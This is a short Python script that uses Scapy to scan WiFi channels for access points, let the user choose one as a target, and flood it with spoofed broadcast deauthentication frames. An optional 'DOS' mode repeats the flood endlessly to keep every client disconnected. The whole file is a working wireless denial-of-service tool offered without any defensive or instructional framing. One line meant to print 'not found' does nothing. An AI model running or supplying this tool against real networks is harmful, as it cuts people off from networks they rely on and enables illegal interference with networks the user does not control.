from scapy.all import *
from scapy.layers.dot11 import *
import subprocess

def get_wifi_networks(interface='wlan0mon', band='2.4'):
    networks = []

    def packet_handler(packet):
        if packet.haslayer(Dot11Beacon):
            essid = packet[Dot11Elt].info.decode()
            bssid = packet[Dot11].addr3

            if essid not in [net[0] for net in networks]:
                networks.append((essid, bssid))

    if band == '2.4':
        channels = range(1, 14)
    elif band == '5':
        channels = range(36, 166)
    else:
        print("Banda não suportada.")
        return []

    try:
        for channel in channels:
            subprocess.run(["sudo", "iw", interface, "set", "channel", str(channel)])
            sniff(iface=interface, timeout=2, prn=packet_handler)
    except KeyboardInterrupt:
        pass

    return networks

def deauth_devices(target_bssid, dos=False, iface="wlan0mon"):
    deauth_packet = RadioTap() / Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=target_bssid, addr3=target_bssid) / Dot11Deauth()
    try:
        while True:
            sendp(deauth_packet, iface=iface, count=100, inter=0.1)
            if not dos:
                break
    except KeyboardInterrupt:
        exit()

if __name__=="__main__":
    band = input('Band? [2.4 OR 5]')
    print("scanning..")
    wifi_networks = get_wifi_networks(band=band)

    if wifi_networks:
        print('found: ')
        for i, (essid, bssid) in enumerate(wifi_networks, start=1):
            print(f"{i}. ESSID: {essid}, BSSID: {bssid}")

        try:
            selected = int(input("select target number: "))
            dos = bool(int(input("DOS? [0=False, 1=True]: ")))
        except:
            selected = 0
            dos = False
        if 1 <= selected <= len(wifi_networks):
            selected_bssid = wifi_networks[selected - 1][1]
            print("Sending deauth")
            deauth_devices(selected_bssid, dos)
        else:
            print('invalid option..')
    else:
        ('not found..')
